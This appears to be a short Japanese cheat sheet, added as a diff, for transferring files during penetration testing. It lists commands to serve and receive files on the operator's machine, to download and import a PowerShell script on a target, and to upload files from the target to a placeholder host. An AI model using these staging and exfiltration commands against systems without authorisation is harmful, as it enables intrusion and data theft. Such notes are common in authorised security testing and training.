@@ -1,0 +1,28 @@
+% 受け渡し, http.server
+
+# http.server: ~/xfer を配る（手元。相手から落とす。8000）
+python -m http.server 8000 -d ~/xfer
+
+
+% 受け渡し, uploadserver
+
+# uploadserver: 受け取る（手元。相手から送り返す。/upload・8100）
+python -m uploadserver 8100
+
+
+% 受け渡し, wget
+
+# wget: 相手に落とす（~/xfer から。相手の OS で Windows（PowerShell）・Linux を選ぶ）
+wget http://<connect>:8000/<xfer_file> <wget_os>
+
+
+% 受け渡し, Import-Module
+
+# Import-Module: 読み込む（相手で。~/xfer から）
+Import-Module .\<xfer_file>
+
+
+% 受け渡し, PSUpload
+
+# Invoke-FileUpload: 相手から送り返す（PSUpload.ps1 を読み込んでから。/upload・8100）
+Invoke-FileUpload -Uri http://<connect>:8100/upload -File <upload_file>
